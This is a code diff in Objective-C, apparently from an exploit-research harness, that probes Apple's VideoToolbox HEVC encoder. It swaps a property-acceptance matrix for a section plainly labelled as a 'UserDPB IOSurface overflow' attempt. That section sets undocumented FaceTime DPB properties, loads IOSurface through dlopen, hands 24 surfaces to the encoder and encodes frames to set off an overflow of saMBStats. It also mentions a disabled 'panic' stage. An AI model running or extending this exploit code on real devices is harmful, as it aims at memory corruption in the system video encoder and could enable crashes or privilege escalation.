@@ -348,107 +348,97 @@
         [report appendString:@"  dlopen IOSurface failed\n"];
     }
 
-    // === AVE27 stage14: EncoderUsage/RCMode acceptance matrix ===
-    [report appendString:@"\n--- AVE27 stage14: EncoderUsage/RCMode matrix ---\n"];
-    int usages[] = { 0, 1, 2, 3, 4 };
-    int rcModes[] = { 0, 1, 2, 3, 4, 5, 10, 20 };
-    for (int u = 0; u < 5; u++) {
-        for (int r = 0; r < 8; r++) {
-            VTCompressionSessionRef sm = NULL;
-            OSStatus stm = VTCompressionSessionCreate(
-                kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
-                NULL, NULL, NULL, NULL, NULL, &sm);
-            if (stm != noErr || !sm) continue;
-            // Set EncoderUsage first
-            int usage = usages[u];
-            CFNumberRef nu = CFNumberCreate(NULL, kCFNumberIntType, &usage);
-            OSStatus stU = VTSessionSetProperty(sm, CFSTR("EncoderUsage"), nu);
-            CFRelease(nu);
-            // Then RCMode
-            int rcMode = rcModes[r];
-            CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
-            OSStatus stR = VTSessionSetProperty(sm, CFSTR("RCMode"), nr);
-            CFRelease(nr);
-            // Try UserDPB
-            int val8 = 8;
-            CFNumberRef n8 = CFNumberCreate(NULL, kCFNumberIntType, &val8);
-            OSStatus stD = VTSessionSetProperty(sm, CFSTR("UserDPBFramesForFaceTime"), n8);
-            CFRelease(n8);
-            // Only log if something works
-            if (stU == 0 || stR == 0 || stD == 0) {
-                [report appendFormat:@"  usage=%d rc=%d: U=%d R=%d DPB=%d\n", usage, rcMode, (int)stU, (int)stR, (int)stD];
-            }
-            CFRelease(sm);
-        }
-    }
-    [report appendString:@"  matrix done (only logged accepted combos)\n"];
+    // === UserDPB IOSurface overflow (AVE27 stage12) ===
+    [report appendString:@"\n--- UserDPB IOSurface overflow ---\n"];
+    [report appendString:@"Target: saMBStats[m] overflow via DPB=24 surfaces\n"];
 
-    // === RCMode first, then EncoderUsage ===
-    [report appendString:@"\n--- RCMode first, then EncoderUsage ---\n"];
-    for (int r = 0; r < 8; r++) {
-        VTCompressionSessionRef sm = NULL;
-        OSStatus stm = VTCompressionSessionCreate(
-            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
-            NULL, NULL, NULL, NULL, NULL, &sm);
-        if (stm != noErr || !sm) continue;
-        int rcMode = rcModes[r];
-        CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
-        OSStatus stR = VTSessionSetProperty(sm, CFSTR("RCMode"), nr);
-        CFRelease(nr);
-        int usage = 1;
-        CFNumberRef nu = CFNumberCreate(NULL, kCFNumberIntType, &usage);
-        OSStatus stU = VTSessionSetProperty(sm, CFSTR("EncoderUsage"), nu);
-        CFRelease(nu);
-        int val8 = 8;
-        CFNumberRef n8 = CFNumberCreate(NULL, kCFNumberIntType, &val8);
-        OSStatus stD = VTSessionSetProperty(sm, CFSTR("UserDPBFramesForFaceTime"), n8);
-        CFRelease(n8);
-        if (stR == 0 || stU == 0 || stD == 0) {
-            [report appendFormat:@"  rc=%d usage=1: R=%d U=%d DPB=%d\n", rcMode, (int)stR, (int)stU, (int)stD];
-        }
-        CFRelease(sm);
-    }
-    [report appendString:@"  reverse order done\n"];
-
-    // === UserDPB properties (AVE27 stage12) — proper order ===
-    [report appendString:@"\n--- UserDPB properties (AVE27 stage12) ---\n"];
-    VTCompressionSessionRef sdpb = NULL;
-    OSStatus stdpb = VTCompressionSessionCreate(
+    VTCompressionSessionRef sDPB = NULL;
+    OSStatus stDPB = VTCompressionSessionCreate(
         kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
-        NULL, NULL, NULL, NULL, NULL, &sdpb);
-    if (stdpb == noErr && sdpb) {
-        // Step 1: EncoderUsage=1 (enables extended properties)
+        NULL, NULL, NULL, NULL, NULL, &sDPB);
+    if (stDPB != noErr || !sDPB) {
+        [report appendFormat:@"  session create: %d\n", (int)stDPB];
+    } else {
+        // EncoderUsage=1
         int usage = 1;
         CFNumberRef nu = CFNumberCreate(NULL, kCFNumberIntType, &usage);
-        OSStatus stU = VTSessionSetProperty(sdpb, CFSTR("EncoderUsage"), nu);
+        VTSessionSetProperty(sDPB, CFSTR("EncoderUsage"), nu);
         CFRelease(nu);
-        [report appendFormat:@"  EncoderUsage=1 -> %d\n", (int)stU];
 
-        // Step 2: RCMode=20
-        int rcMode = 20;
-        CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &rcMode);
-        OSStatus stR = VTSessionSetProperty(sdpb, CFSTR("RCMode"), nr);
+        // EnableUserRefForFacetime=1
+        int userRef = 1;
+        CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &userRef);
+        OSStatus stRef = VTSessionSetProperty(sDPB, CFSTR("EnableUserRefForFacetime"), nr);
         CFRelease(nr);
-        [report appendFormat:@"  RCMode=20 -> %d\n", (int)stR];
+        [report appendFormat:@"  EnableUserRefForFacetime=1 -> %d\n", (int)stRef];
 
-        // Step 3: Test UserDPB keys with proper values
-        int val24 = 24;
-        CFNumberRef n24 = CFNumberCreate(NULL, kCFNumberIntType, &val24);
-        if (n24) {
-            OSStatus st1 = VTSessionSetProperty(sdpb, CFSTR("UserDPBFramesForFaceTime"), n24);
-            [report appendFormat:@"  UserDPBFramesForFaceTime=24 -> %d\n", (int)st1];
-            OSStatus st2 = VTSessionSetProperty(sdpb, CFSTR("EnableUserRefForFacetime"), n24);
-            [report appendFormat:@"  EnableUserRefForFacetime=24 -> %d\n", (int)st2];
-            CFRelease(n24);
+        // UserDPBFramesForFaceTime=24
+        int dpbFrames = 24;
+        CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &dpbFrames);
+        OSStatus stFrames = VTSessionSetProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), nf);
+        CFRelease(nf);
+        [report appendFormat:@"  UserDPBFramesForFaceTime=24 -> %d\n", (int)stFrames];
+
+        // Create 24 IOSurfaces via dlopen
+        NSMutableArray *surfaces = [NSMutableArray array];
+        void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
+        if (isLib) {
+            typedef void *(*ISCreateFn)(CFDictionaryRef);
+            ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
+            if (isCreate) {
+                for (int i = 0; i < 24; i++) {
+                    NSDictionary *sp = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4 };
+                    void *surf = isCreate((__bridge CFDictionaryRef)sp);
+                    if (surf) [surfaces addObject:(__bridge id)surf];
+                }
+            }
+        }
+        [report appendFormat:@"  surfaces created: %lu\n", (unsigned long)surfaces.count];
+
+        // Set UserDPB with IOSurface array
+        if (surfaces.count > 0) {
+            OSStatus stDPBSet = VTSessionSetProperty(sDPB, CFSTR("UserDPB"), (__bridge CFArrayRef)surfaces);
+            [report appendFormat:@"  UserDPB (array) -> %d\n", (int)stDPBSet];
         }
 
-        // Step 4: DPBRequirements as array
-        NSMutableArray *dpbArr = [NSMutableArray array];
-        for (int i = 0; i < 24; i++) [dpbArr addObject:@(i)];
-        OSStatus st4 = VTSessionSetProperty(sdpb, CFSTR("DPBRequirements"), (__bridge CFArrayRef)dpbArr);
-        [report appendFormat:@"  DPBRequirements array(24) -> %d\n", (int)st4];
+        // DPBRequirements
+        NSMutableArray *dpbReq = [NSMutableArray array];
+        for (int i = 0; i < 24; i++) [dpbReq addObject:@(i)];
+        OSStatus stReq = VTSessionSetProperty(sDPB, CFSTR("DPBRequirements"), (__bridge CFArrayRef)dpbReq);
+        [report appendFormat:@"  DPBRequirements(24) -> %d\n", (int)stReq];
 
-        CFRelease(sdpb);
+        // Encode with B-frames
+        VTSessionSetProperty(sDPB, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
+        OSStatus stPrep = VTCompressionSessionPrepareToEncodeFrames(sDPB);
+        [report appendFormat:@"  prepare -> %d\n", (int)stPrep];
+
+        if (stPrep == noErr) {
+            for (int i = 0; i < 3; i++) {
+                CVPixelBufferRef pbD = NULL;
+                CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pbD);
+                if (!pbD) continue;
+                CVPixelBufferLockBaseAddress(pbD, 0);
+                memset(CVPixelBufferGetBaseAddress(pbD), 0x80, CVPixelBufferGetDataSize(pbD));
+                CVPixelBufferUnlockBaseAddress(pbD, 0);
+                VTEncodeInfoFlags fD = 0;
+                OSStatus stE = VTCompressionSessionEncodeFrame(sDPB, pbD, CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &fD);
+                [report appendFormat:@"  encode[%d] -> %d\n", i, (int)stE];
+                CVPixelBufferRelease(pbD);
+            }
+        }
+
+        // Readback
+        CFNumberRef rb = NULL;
+        VTSessionCopyProperty(sDPB, CFSTR("UserDPBFramesForFaceTime"), NULL, &rb);
+        if (rb) {
+            int v = 0;
+            CFNumberGetValue(rb, kCFNumberIntType, &v);
+            [report appendFormat:@"  readback UserDPBFramesForFaceTime=%d\n", v];
+            CFRelease(rb);
+        }
+
+        VTCompressionSessionCompleteFrames(sDPB, kCMTimeInvalid);
+        CFRelease(sDPB);
     }
 
     // === stage9 PANIC RUNG — DISABLED ===
